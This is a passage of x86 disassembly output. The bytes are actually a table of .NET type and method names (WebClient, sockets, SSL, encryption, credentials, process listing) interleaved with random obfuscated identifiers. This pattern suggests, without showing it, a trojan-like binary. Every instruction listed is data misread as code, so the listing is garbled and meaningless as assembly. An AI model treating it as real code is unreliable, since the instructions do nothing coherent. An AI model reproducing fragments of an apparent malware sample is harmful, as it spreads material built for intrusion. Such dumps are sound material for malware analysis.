  409535:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  40953c:	6e                   	outsb  %ds:(%esi),(%dx)
  40953d:	67 45                	addr16 inc %ebp
  40953f:	76 65                	jbe    0x4095a6
  409541:	6e                   	outsb  %ds:(%esi),(%dx)
  409542:	74 48                	je     0x40958c
  409544:	61                   	popa
  409545:	6e                   	outsb  %ds:(%esi),(%dx)
  409546:	64 6c                	fs insb (%dx),%es:(%edi)
  409548:	65 72 00             	gs jb  0x40954b
  40954b:	54                   	push   %esp
  40954c:	69 6d 65 72 00 54 6f 	imul   $0x6f540072,0x65(%ebp),%ebp
  409553:	55                   	push   %ebp
  409554:	70 70                	jo     0x4095c6
  409556:	65 72 00             	gs jb  0x409559
  409559:	43                   	inc    %ebx
  40955a:	75 72                	jne    0x4095ce
  40955c:	72 65                	jb     0x4095c3
  40955e:	6e                   	outsb  %ds:(%esi),(%dx)
  40955f:	74 55                	je     0x4095b6
  409561:	73 65                	jae    0x4095c8
  409563:	72 00                	jb     0x409565
  409565:	53                   	push   %ebx
  409566:	74 72                	je     0x4095da
  409568:	65 61                	gs popa
  40956a:	6d                   	insl   (%dx),%es:(%edi)
  40956b:	57                   	push   %edi
  40956c:	72 69                	jb     0x4095d7
  40956e:	74 65                	je     0x4095d5
  409570:	72 00                	jb     0x409572
  409572:	54                   	push   %esp
  409573:	65 78 74             	gs js  0x4095ea
  409576:	57                   	push   %edi
  409577:	72 69                	jb     0x4095e2
  409579:	74 65                	je     0x4095e0
  40957b:	72 00                	jb     0x40957d
  40957d:	45                   	inc    %ebp
  40957e:	6e                   	outsb  %ds:(%esi),(%dx)
  40957f:	74 65                	je     0x4095e6
  409581:	72 00                	jb     0x409583
  409583:	42                   	inc    %edx
  409584:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  40958b:	72 
  40958c:	74 65                	je     0x4095f3
  40958e:	72 00                	jb     0x409590
  409590:	54                   	push   %esp
  409591:	6f                   	outsl  %ds:(%esi),(%dx)
  409592:	4c                   	dec    %esp
  409593:	6f                   	outsl  %ds:(%esi),(%dx)
  409594:	77 65                	ja     0x4095fb
  409596:	72 00                	jb     0x409598
  409598:	71 4e                	jno    0x4095e8
  40959a:	4b                   	dec    %ebx
  40959b:	67 54                	addr16 push %esp
  40959d:	59                   	pop    %ecx
  40959e:	57                   	push   %edi
  40959f:	5a                   	pop    %edx
  4095a0:	68 63 68 72 00       	push   $0x726863
  4095a5:	4d                   	dec    %ebp
  4095a6:	7a 62                	jp     0x40960a
  4095a8:	66 4e                	dec    %si
  4095aa:	45                   	inc    %ebp
  4095ab:	64 54                	fs push %esp
  4095ad:	61                   	popa
  4095ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4095af:	72 00                	jb     0x4095b1
  4095b1:	49                   	dec    %ecx
  4095b2:	45                   	inc    %ebp
  4095b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4095b4:	75 6d                	jne    0x409623
  4095b6:	65 72 61             	gs jb  0x40961a
  4095b9:	74 6f                	je     0x40962a
  4095bb:	72 00                	jb     0x4095bd
  4095bd:	4d                   	dec    %ebp
  4095be:	61                   	popa
  4095bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4095c0:	61                   	popa
  4095c1:	67 65 6d             	gs insl (%dx),%es:(%di)
  4095c4:	65 6e                	outsb  %gs:(%esi),(%dx)
  4095c6:	74 4f                	je     0x409617
  4095c8:	62 6a 65             	bound  %ebp,0x65(%edx)
  4095cb:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  4095cf:	75 6d                	jne    0x40963e
  4095d1:	65 72 61             	gs jb  0x409635
  4095d4:	74 6f                	je     0x409645
  4095d6:	72 00                	jb     0x4095d8
  4095d8:	53                   	push   %ebx
  4095d9:	79 73                	jns    0x40964e
  4095db:	74 65                	je     0x409642
  4095dd:	6d                   	insl   (%dx),%es:(%edi)
  4095de:	2e 43                	cs inc %ebx
  4095e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4095e1:	6c                   	insb   (%dx),%es:(%edi)
  4095e2:	6c                   	insb   (%dx),%es:(%edi)
  4095e3:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4095e8:	6e                   	outsb  %ds:(%esi),(%dx)
  4095e9:	73 2e                	jae    0x409619
  4095eb:	49                   	dec    %ecx
  4095ec:	45                   	inc    %ebp
  4095ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4095ee:	75 6d                	jne    0x40965d
  4095f0:	65 72 61             	gs jb  0x409654
  4095f3:	62 6c 65 2e          	bound  %ebp,0x2e(%ebp,%eiz,2)
  4095f7:	47                   	inc    %edi
  4095f8:	65 74 45             	gs je  0x409640
  4095fb:	6e                   	outsb  %ds:(%esi),(%dx)
  4095fc:	75 6d                	jne    0x40966b
  4095fe:	65 72 61             	gs jb  0x409662
  409601:	74 6f                	je     0x409672
  409603:	72 00                	jb     0x409605
  409605:	41                   	inc    %ecx
  409606:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  40960a:	61                   	popa
  40960b:	74 6f                	je     0x40967c
  40960d:	72 00                	jb     0x40960f
  40960f:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  409614:	00 2e                	add    %ch,(%esi)
  409616:	63 63 74             	arpl   %esp,0x74(%ebx)
  409619:	6f                   	outsl  %ds:(%esi),(%dx)
  40961a:	72 00                	jb     0x40961c
  40961c:	4d                   	dec    %ebp
  40961d:	6f                   	outsl  %ds:(%esi),(%dx)
  40961e:	6e                   	outsb  %ds:(%esi),(%dx)
  40961f:	69 74 6f 72 00 43 72 	imul   $0x65724300,0x72(%edi,%ebp,2),%esi
  409626:	65 
  409627:	61                   	popa
  409628:	74 65                	je     0x40968f
  40962a:	44                   	inc    %esp
  40962b:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  40962f:	70 74                	jo     0x4096a5
  409631:	6f                   	outsl  %ds:(%esi),(%dx)
  409632:	72 00                	jb     0x409634
  409634:	43                   	inc    %ebx
  409635:	72 65                	jb     0x40969c
  409637:	61                   	popa
  409638:	74 65                	je     0x40969f
  40963a:	45                   	inc    %ebp
  40963b:	6e                   	outsb  %ds:(%esi),(%dx)
  40963c:	63 72 79             	arpl   %esi,0x79(%edx)
  40963f:	70 74                	jo     0x4096b5
  409641:	6f                   	outsl  %ds:(%esi),(%dx)
  409642:	72 00                	jb     0x409644
  409644:	59                   	pop    %ecx
  409645:	4f                   	dec    %edi
  409646:	4c                   	dec    %esp
  409647:	56                   	push   %esi
  409648:	6b 68 42 4e          	imul   $0x4e,0x42(%eax),%ebp
  40964c:	6a 54                	push   $0x54
  40964e:	71 71                	jno    0x4096c1
  409650:	72 00                	jb     0x409652
  409652:	45                   	inc    %ebp
  409653:	4c                   	dec    %esp
  409654:	44                   	inc    %esp
  409655:	66 69 42 79 54 42    	imul   $0x4254,0x79(%edx),%ax
  40965b:	73 72                	jae    0x4096cf
  40965d:	00 49 6e             	add    %cl,0x6e(%ecx)
  409660:	74 50                	je     0x4096b2
  409662:	74 72                	je     0x4096d6
  409664:	00 6f 61             	add    %ch,0x61(%edi)
  409667:	67 79 48             	addr16 jns 0x4096b2
  40966a:	77 4d                	ja     0x4096b9
  40966c:	4d                   	dec    %ebp
  40966d:	64 67 4e             	fs addr16 dec %esi
  409670:	4e                   	dec    %esi
  409671:	78 72                	js     0x4096e5
  409673:	00 6d 57             	add    %ch,0x57(%ebp)
  409676:	65 4f                	gs dec %edi
  409678:	4c                   	dec    %esp
  409679:	6c                   	insb   (%dx),%es:(%edi)
  40967a:	54                   	push   %esp
  40967b:	46                   	inc    %esi
  40967c:	77 78                	ja     0x4096f6
  40967e:	47                   	inc    %edi
  40967f:	73 00                	jae    0x409681
  409681:	6b 47 41 7a          	imul   $0x7a,0x41(%edi),%eax
  409685:	4a                   	dec    %edx
  409686:	4e                   	dec    %esi
  409687:	54                   	push   %esp
  409688:	75 5a                	jne    0x4096e4
  40968a:	52                   	push   %edx
  40968b:	44                   	inc    %esp
  40968c:	68 53 48 4b 73       	push   $0x734b4853
  409691:	00 53 6e             	add    %dl,0x6e(%ebx)
  409694:	61                   	popa
  409695:	48                   	dec    %eax
  409696:	76 53                	jbe    0x4096eb
  409698:	71 6f                	jno    0x409709
  40969a:	47                   	inc    %edi
  40969b:	56                   	push   %esi
  40969c:	50                   	push   %eax
  40969d:	73 00                	jae    0x40969f
  40969f:	63 59 64             	arpl   %ebx,0x64(%ecx)
  4096a2:	47                   	inc    %edi
  4096a3:	4c                   	dec    %esp
  4096a4:	75 7a                	jne    0x409720
  4096a6:	78 75                	js     0x40971d
  4096a8:	63 5a 73             	arpl   %ebx,0x73(%edx)
  4096ab:	00 53 79             	add    %dl,0x79(%ebx)
  4096ae:	73 74                	jae    0x409724
  4096b0:	65 6d                	gs insl (%dx),%es:(%edi)
  4096b2:	2e 44                	cs inc %esp
  4096b4:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  4096bb:	69 63 73 00 4d 69 63 	imul   $0x63694d00,0x73(%ebx),%esp
  4096c2:	72 6f                	jb     0x409733
  4096c4:	73 6f                	jae    0x409735
  4096c6:	66 74 2e             	data16 je 0x4096f7
  4096c9:	56                   	push   %esi
  4096ca:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  4096d1:	73 69                	jae    0x40973c
  4096d3:	63 2e                	arpl   %ebp,(%esi)
  4096d5:	44                   	inc    %esp
  4096d6:	65 76 69             	gs jbe 0x409742
  4096d9:	63 65 73             	arpl   %esp,0x73(%ebp)
  4096dc:	00 53 79             	add    %dl,0x79(%ebx)
  4096df:	73 74                	jae    0x409755
  4096e1:	65 6d                	gs insl (%dx),%es:(%edi)
  4096e3:	2e 52                	cs push %edx
  4096e5:	75 6e                	jne    0x409755
  4096e7:	74 69                	je     0x409752
  4096e9:	6d                   	insl   (%dx),%es:(%edi)
  4096ea:	65 2e 49             	gs cs dec %ecx
  4096ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4096ee:	74 65                	je     0x409755
  4096f0:	72 6f                	jb     0x409761
  4096f2:	70 53                	jo     0x409747
  4096f4:	65 72 76             	gs jb  0x40976d
  4096f7:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  4096fe:	73 74                	jae    0x409774
  409700:	65 6d                	gs insl (%dx),%es:(%edi)
  409702:	2e 52                	cs push %edx
  409704:	75 6e                	jne    0x409774
  409706:	74 69                	je     0x409771
  409708:	6d                   	insl   (%dx),%es:(%edi)
  409709:	65 2e 43             	gs cs inc %ebx
  40970c:	6f                   	outsl  %ds:(%esi),(%dx)
  40970d:	6d                   	insl   (%dx),%es:(%edi)
  40970e:	70 69                	jo     0x409779
  409710:	6c                   	insb   (%dx),%es:(%edi)
  409711:	65 72 53             	gs jb  0x409767
  409714:	65 72 76             	gs jb  0x40978d
  409717:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  40971e:	62 75 67             	bound  %esi,0x67(%ebp)
  409721:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  409728:	65 
  409729:	73 00                	jae    0x40972b
  40972b:	45                   	inc    %ebp
  40972c:	78 70                	js     0x40979e
  40972e:	61                   	popa
  40972f:	6e                   	outsb  %ds:(%esi),(%dx)
  409730:	64 45                	fs inc %ebp
  409732:	6e                   	outsb  %ds:(%esi),(%dx)
  409733:	76 69                	jbe    0x40979e
  409735:	72 6f                	jb     0x4097a6
  409737:	6e                   	outsb  %ds:(%esi),(%dx)
  409738:	6d                   	insl   (%dx),%es:(%edi)
  409739:	65 6e                	outsb  %gs:(%esi),(%dx)
  40973b:	74 56                	je     0x409793
  40973d:	61                   	popa
  40973e:	72 69                	jb     0x4097a9
  409740:	61                   	popa
  409741:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  409745:	00 47 65             	add    %al,0x65(%edi)
  409748:	74 50                	je     0x40979a
  40974a:	72 6f                	jb     0x4097bb
  40974c:	63 65 73             	arpl   %esp,0x73(%ebp)
  40974f:	73 65                	jae    0x4097b6
  409751:	73 00                	jae    0x409753
  409753:	47                   	inc    %edi
  409754:	65 74 48             	gs je  0x40979f
  409757:	6f                   	outsl  %ds:(%esi),(%dx)
  409758:	73 74                	jae    0x4097ce
  40975a:	41                   	inc    %ecx
  40975b:	64 64 72 65          	fs fs jb 0x4097c4
  40975f:	73 73                	jae    0x4097d4
  409761:	65 73 00             	gs jae 0x409764
  409764:	53                   	push   %ebx
  409765:	79 73                	jns    0x4097da
  409767:	74 65                	je     0x4097ce
  409769:	6d                   	insl   (%dx),%es:(%edi)
  40976a:	2e 53                	cs push %ebx
  40976c:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409770:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  409777:	70 
  409778:	74 6f                	je     0x4097e9
  40977a:	67 72 61             	addr16 jb 0x4097de
  40977d:	70 68                	jo     0x4097e7
  40977f:	79 2e                	jns    0x4097af
  409781:	58                   	pop    %eax
  409782:	35 30 39 43 65       	xor    $0x65433930,%eax
  409787:	72 74                	jb     0x4097fd
  409789:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  409790:	73 00                	jae    0x409792
  409792:	52                   	push   %edx
  409793:	66 63 32             	arpl   %si,(%edx)
  409796:	38 39                	cmp    %bh,(%ecx)
  409798:	38 44 65 72          	cmp    %al,0x72(%ebp,%eiz,2)
  40979c:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  4097a3:	73 00                	jae    0x4097a5
  4097a5:	52                   	push   %edx
  4097a6:	65 61                	gs popa
  4097a8:	64 41                	fs inc %ecx
  4097aa:	6c                   	insb   (%dx),%es:(%edi)
  4097ab:	6c                   	insb   (%dx),%es:(%edi)
  4097ac:	42                   	inc    %edx
  4097ad:	79 74                	jns    0x409823
  4097af:	65 73 00             	gs jae 0x4097b2
  4097b2:	47                   	inc    %edi
  4097b3:	65 74 42             	gs je  0x4097f8
  4097b6:	79 74                	jns    0x40982c
  4097b8:	65 73 00             	gs jae 0x4097bb
  4097bb:	43                   	inc    %ebx
  4097bc:	53                   	push   %ebx
  4097bd:	68 61 72 70 41       	push   $0x41707261
  4097c2:	72 67                	jb     0x40982b
  4097c4:	75 6d                	jne    0x409833
  4097c6:	65 6e                	outsb  %gs:(%esi),(%dx)
  4097c8:	74 49                	je     0x409813
  4097ca:	6e                   	outsb  %ds:(%esi),(%dx)
  4097cb:	66 6f                	outsw  %ds:(%esi),(%dx)
  4097cd:	46                   	inc    %esi
  4097ce:	6c                   	insb   (%dx),%es:(%edi)
  4097cf:	61                   	popa
  4097d0:	67 73 00             	addr16 jae 0x4097d3
  4097d3:	43                   	inc    %ebx
  4097d4:	53                   	push   %ebx
  4097d5:	68 61 72 70 42       	push   $0x42707261
  4097da:	69 6e 64 65 72 46 6c 	imul   $0x6c467265,0x64(%esi),%ebp
  4097e1:	61                   	popa
  4097e2:	67 73 00             	addr16 jae 0x4097e5
  4097e5:	53                   	push   %ebx
  4097e6:	74 72                	je     0x40985a
  4097e8:	69 6e 67 73 00 53 65 	imul   $0x65530073,0x67(%esi),%ebp
  4097ef:	73 73                	jae    0x409864
  4097f1:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4097f8:	6e                   	outsb  %ds:(%esi),(%dx)
  4097f9:	67 45                	addr16 inc %ebp
  4097fb:	76 65                	jbe    0x409862
  4097fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4097fe:	74 41                	je     0x409841
  409800:	72 67                	jb     0x409869
  409802:	73 00                	jae    0x409804
  409804:	49                   	dec    %ecx
  409805:	43                   	inc    %ebx
  409806:	72 65                	jb     0x40986d
  409808:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  40980b:	74 69                	je     0x409876
  40980d:	61                   	popa
  40980e:	6c                   	insb   (%dx),%es:(%edi)
  40980f:	73 00                	jae    0x409811
  409811:	73 65                	jae    0x409878
  409813:	74 5f                	je     0x409874
  409815:	43                   	inc    %ebx
  409816:	72 65                	jb     0x40987d
  409818:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  40981b:	74 69                	je     0x409886
  40981d:	61                   	popa
  40981e:	6c                   	insb   (%dx),%es:(%edi)
  40981f:	73 00                	jae    0x409821
  409821:	45                   	inc    %ebp
  409822:	71 75                	jno    0x409899
  409824:	61                   	popa
  409825:	6c                   	insb   (%dx),%es:(%edi)
  409826:	73 00                	jae    0x409828
  409828:	53                   	push   %ebx
  409829:	73 6c                	jae    0x409897
  40982b:	50                   	push   %eax
  40982c:	72 6f                	jb     0x40989d
  40982e:	74 6f                	je     0x40989f
  409830:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  409833:	73 00                	jae    0x409835
  409835:	53                   	push   %ebx
  409836:	79 73                	jns    0x4098ab
  409838:	74 65                	je     0x40989f
  40983a:	6d                   	insl   (%dx),%es:(%edi)
  40983b:	2e 57                	cs push %edi
  40983d:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  409844:	46                   	inc    %esi
  409845:	6f                   	outsl  %ds:(%esi),(%dx)
  409846:	72 6d                	jb     0x4098b5
  409848:	73 00                	jae    0x40984a
  40984a:	44                   	inc    %esp
  40984b:	6e                   	outsb  %ds:(%esi),(%dx)
  40984c:	73 00                	jae    0x40984e
  40984e:	43                   	inc    %ebx
  40984f:	6f                   	outsl  %ds:(%esi),(%dx)
  409850:	6e                   	outsb  %ds:(%esi),(%dx)
  409851:	74 61                	je     0x4098b4
  409853:	69 6e 73 00 53 79 73 	imul   $0x73795300,0x73(%esi),%ebp
  40985a:	74 65                	je     0x4098c1
  40985c:	6d                   	insl   (%dx),%es:(%edi)
  40985d:	2e 43                	cs inc %ebx
  40985f:	6f                   	outsl  %ds:(%esi),(%dx)
  409860:	6c                   	insb   (%dx),%es:(%edi)
  409861:	6c                   	insb   (%dx),%es:(%edi)
  409862:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409867:	6e                   	outsb  %ds:(%esi),(%dx)
  409868:	73 00                	jae    0x40986a
  40986a:	53                   	push   %ebx
  40986b:	74 72                	je     0x4098df
  40986d:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
  409874:	74 4f                	je     0x4098c5
  409876:	70 74                	jo     0x4098ec
  409878:	69 6f 6e 73 00 47 65 	imul   $0x65470073,0x6e(%edi),%ebp
  40987f:	74 49                	je     0x4098ca
  409881:	6d                   	insl   (%dx),%es:(%edi)
  409882:	61                   	popa
  409883:	67 65 44             	addr16 gs inc %esp
  409886:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  40988a:	65 72 73             	gs jb  0x409900
  40988d:	00 52 75             	add    %dl,0x75(%edx)
  409890:	6e                   	outsb  %ds:(%esi),(%dx)
  409891:	74 69                	je     0x4098fc
  409893:	6d                   	insl   (%dx),%es:(%edi)
  409894:	65 48                	gs dec %eax
  409896:	65 6c                	gs insb (%dx),%es:(%edi)
  409898:	70 65                	jo     0x4098ff
  40989a:	72 73                	jb     0x40990f
  40989c:	00 53 73             	add    %dl,0x73(%ebx)
  40989f:	6c                   	insb   (%dx),%es:(%edi)
  4098a0:	50                   	push   %eax
  4098a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4098a2:	6c                   	insb   (%dx),%es:(%edi)
  4098a3:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  4098aa:	72 73                	jb     0x40991f
  4098ac:	00 46 69             	add    %al,0x69(%esi)
  4098af:	6c                   	insb   (%dx),%es:(%edi)
  4098b0:	65 41                	gs inc %ecx
  4098b2:	63 63 65             	arpl   %esp,0x65(%ebx)
  4098b5:	73 73                	jae    0x40992a
  4098b7:	00 47 65             	add    %al,0x65(%edi)
  4098ba:	74 43                	je     0x4098ff
  4098bc:	75 72                	jne    0x409930
  4098be:	72 65                	jb     0x409925
  4098c0:	6e                   	outsb  %ds:(%esi),(%dx)
  4098c1:	74 50                	je     0x409913
  4098c3:	72 6f                	jb     0x409934
  4098c5:	63 65 73             	arpl   %esp,0x73(%ebp)
  4098c8:	73 00                	jae    0x4098ca
  4098ca:	49                   	dec    %ecx
  4098cb:	50                   	push   %eax
  4098cc:	41                   	inc    %ecx
  4098cd:	64 64 72 65          	fs fs jb 0x409936
  4098d1:	73 73                	jae    0x409946
  4098d3:	00 53 79             	add    %dl,0x79(%ebx)
  4098d6:	73 74                	jae    0x40994c
  4098d8:	65 6d                	gs insl (%dx),%es:(%edi)
  4098da:	2e 4e                	cs dec %esi
  4098dc:	65 74 2e             	gs je  0x40990d
  4098df:	53                   	push   %ebx
  4098e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4098e1:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4098e4:	74 73                	je     0x409959
  4098e6:	00 73 65             	add    %dh,0x65(%ebx)
  4098e9:	74 5f                	je     0x40994a
  4098eb:	41                   	inc    %ecx
  4098ec:	72 67                	jb     0x409955
  4098ee:	75 6d                	jne    0x40995d
  4098f0:	65 6e                	outsb  %gs:(%esi),(%dx)
  4098f2:	74 73                	je     0x409967
  4098f4:	00 53 79             	add    %dl,0x79(%ebx)
  4098f7:	73 74                	jae    0x40996d
  4098f9:	65 6d                	gs insl (%dx),%es:(%edi)
  4098fb:	45                   	inc    %ebp
  4098fc:	76 65                	jbe    0x409963
  4098fe:	6e                   	outsb  %ds:(%esi),(%dx)
  4098ff:	74 73                	je     0x409974
  409901:	00 45 78             	add    %al,0x78(%ebp)
  409904:	69 73 74 73 00 69 75 	imul   $0x75690073,0x74(%ebx),%esi
  40990b:	47                   	inc    %edi
  40990c:	62 6b 78             	bound  %ebp,0x78(%ebx)
  40990f:	47                   	inc    %edi
  409910:	6d                   	insl   (%dx),%es:(%edi)
  409911:	58                   	pop    %eax
  409912:	75 77                	jne    0x40998b
  409914:	4b                   	dec    %ebx
  409915:	78 73                	js     0x40998a
  409917:	00 73 55             	add    %dh,0x55(%ebx)
  40991a:	69 78 48 4c 71 53 5a 	imul   $0x5a53714c,0x48(%eax),%edi
  409921:	52                   	push   %edx
  409922:	74 00                	je     0x409924
  409924:	57                   	push   %edi
  409925:	54                   	push   %esp
  409926:	50                   	push   %eax
  409927:	4a                   	dec    %edx
  409928:	56                   	push   %esi
  409929:	68 45 68 79 7a       	push   $0x7a796845
  40992e:	52                   	push   %edx
  40992f:	74 00                	je     0x409931
  409931:	55                   	push   %ebp
  409932:	48                   	dec    %eax
  409933:	57                   	push   %edi
  409934:	44                   	inc    %esp
  409935:	66 6d                	insw   (%dx),%es:(%edi)
  409937:	43                   	inc    %ebx
  409938:	61                   	popa
  409939:	44                   	inc    %esp
  40993a:	69 4c 58 74 00 43 6f 	imul   $0x6e6f4300,0x74(%eax,%ebx,2),%ecx
  409941:	6e 
  409942:	63 61 74             	arpl   %esp,0x74(%ecx)
  409945:	00 49 6d             	add    %cl,0x6d(%ecx)
  409948:	61                   	popa
  409949:	67 65 46             	addr16 gs inc %esi
  40994c:	6f                   	outsl  %ds:(%esi),(%dx)
  40994d:	72 6d                	jb     0x4099bc
  40994f:	61                   	popa
  409950:	74 00                	je     0x409952
  409952:	67 65 74 5f          	addr16 gs je 0x4099b5
  409956:	41                   	inc    %ecx
  409957:	73 46                	jae    0x40999f
  409959:	6c                   	insb   (%dx),%es:(%edi)
  40995a:	6f                   	outsl  %ds:(%esi),(%dx)
  40995b:	61                   	popa
  40995c:	74 00                	je     0x40995e
  40995e:	73 65                	jae    0x4099c5
  409960:	74 5f                	je     0x4099c1
  409962:	41                   	inc    %ecx
  409963:	73 46                	jae    0x4099ab
  409965:	6c                   	insb   (%dx),%es:(%edi)
  409966:	6f                   	outsl  %ds:(%esi),(%dx)
  409967:	61                   	popa
  409968:	74 00                	je     0x40996a
  40996a:	4d                   	dec    %ebp
  40996b:	61                   	popa
  40996c:	6e                   	outsb  %ds:(%esi),(%dx)
  40996d:	61                   	popa
  40996e:	67 65 6d             	gs insl (%dx),%es:(%di)
  409971:	65 6e                	outsb  %gs:(%esi),(%dx)
  409973:	74 42                	je     0x4099b7
  409975:	61                   	popa
  409976:	73 65                	jae    0x4099dd
  409978:	4f                   	dec    %edi
  409979:	62 6a 65             	bound  %ebp,0x65(%edx)
  40997c:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  409980:	6f                   	outsl  %ds:(%esi),(%dx)
  409981:	6c                   	insb   (%dx),%es:(%edi)
  409982:	6c                   	insb   (%dx),%es:(%edi)
  409983:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
  409988:	6f                   	outsl  %ds:(%esi),(%dx)
  409989:	6e                   	outsb  %ds:(%esi),(%dx)
  40998a:	6e                   	outsb  %ds:(%esi),(%dx)
  40998b:	65 63 74 00 47       	arpl   %esi,%gs:0x47(%eax,%eax,1)
  409990:	65 74 00             	gs je  0x409993
  409993:	53                   	push   %ebx
  409994:	79 73                	jns    0x409a09
  409996:	74 65                	je     0x4099fd
  409998:	6d                   	insl   (%dx),%es:(%edi)
  409999:	2e 4e                	cs dec %esi
  40999b:	65 74 00             	gs je  0x40999e
  40999e:	54                   	push   %esp
  40999f:	61                   	popa
  4099a0:	72 67                	jb     0x409a09
  4099a2:	65 74 00             	gs je  0x4099a5
  4099a5:	53                   	push   %ebx
  4099a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4099a7:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4099aa:	74 00                	je     0x4099ac
  4099ac:	53                   	push   %ebx
  4099ad:	79 73                	jns    0x409a22
  4099af:	74 65                	je     0x409a16
  4099b1:	6d                   	insl   (%dx),%es:(%edi)
  4099b2:	2e 43                	cs inc %ebx
  4099b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4099b5:	6c                   	insb   (%dx),%es:(%edi)
  4099b6:	6c                   	insb   (%dx),%es:(%edi)
  4099b7:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4099bc:	6e                   	outsb  %ds:(%esi),(%dx)
  4099bd:	73 2e                	jae    0x4099ed
  4099bf:	49                   	dec    %ecx
  4099c0:	45                   	inc    %ebp
  4099c1:	6e                   	outsb  %ds:(%esi),(%dx)
  4099c2:	75 6d                	jne    0x409a31
  4099c4:	65 72 61             	gs jb  0x409a28
  4099c7:	74 6f                	je     0x409a38
  4099c9:	72 2e                	jb     0x4099f9
  4099cb:	52                   	push   %edx
  4099cc:	65 73 65             	gs jae 0x409a34
  4099cf:	74 00                	je     0x4099d1
  4099d1:	67 65 74 5f          	addr16 gs je 0x409a34
  4099d5:	4f                   	dec    %edi
  4099d6:	66 66 73 65          	data16 data16 jae 0x409a3f
  4099da:	74 00                	je     0x4099dc
  4099dc:	73 65                	jae    0x409a43
  4099de:	74 5f                	je     0x409a3f
  4099e0:	4f                   	dec    %edi
  4099e1:	66 66 73 65          	data16 data16 jae 0x409a4a
  4099e5:	74 00                	je     0x4099e7
  4099e7:	75 79                	jne    0x409a62
  4099e9:	57                   	push   %edi
  4099ea:	56                   	push   %esi
  4099eb:	57                   	push   %edi
  4099ec:	64 47                	fs inc %edi
  4099ee:	42                   	inc    %edx
  4099ef:	58                   	pop    %eax
  4099f0:	67 74 00             	addr16 je 0x4099f3
  4099f3:	53                   	push   %ebx
  4099f4:	70 6c                	jo     0x409a62
  4099f6:	69 74 00 45 78 69 74 	imul   $0x746978,0x45(%eax,%eax,1),%esi
  4099fd:	00 
  4099fe:	73 69                	jae    0x409a69
  409a00:	70 68                	jo     0x409a6a
  409a02:	55                   	push   %ebp
  409a03:	4e                   	dec    %esi
  409a04:	56                   	push   %esi
  409a05:	4a                   	dec    %edx
  409a06:	66 6a 74             	pushw  $0x74
  409a09:	00 49 41             	add    %cl,0x41(%ecx)
  409a0c:	73 79                	jae    0x409a87
  409a0e:	6e                   	outsb  %ds:(%esi),(%dx)
  409a0f:	63 52 65             	arpl   %edx,0x65(%edx)
  409a12:	73 75                	jae    0x409a89
  409a14:	6c                   	insb   (%dx),%es:(%edi)
  409a15:	74 00                	je     0x409a17
  409a17:	54                   	push   %esp
  409a18:	6f                   	outsl  %ds:(%esi),(%dx)
  409a19:	55                   	push   %ebp
  409a1a:	70 70                	jo     0x409a8c
  409a1c:	65 72 49             	gs jb  0x409a68
  409a1f:	6e                   	outsb  %ds:(%esi),(%dx)
  409a20:	76 61                	jbe    0x409a83
  409a22:	72 69                	jb     0x409a8d
  409a24:	61                   	popa
  409a25:	6e                   	outsb  %ds:(%esi),(%dx)
  409a26:	74 00                	je     0x409a28
  409a28:	57                   	push   %edi
  409a29:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  409a2d:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409a34:	74 5f                	je     0x409a95
  409a36:	53                   	push   %ebx
  409a37:	73 6c                	jae    0x409aa5
  409a39:	43                   	inc    %ebx
  409a3a:	6c                   	insb   (%dx),%es:(%edi)
  409a3b:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409a42:	74 5f                	je     0x409aa3
  409a44:	53                   	push   %ebx
  409a45:	73 6c                	jae    0x409ab3
  409a47:	43                   	inc    %ebx
  409a48:	6c                   	insb   (%dx),%es:(%edi)
  409a49:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409a50:	74 5f                	je     0x409ab1
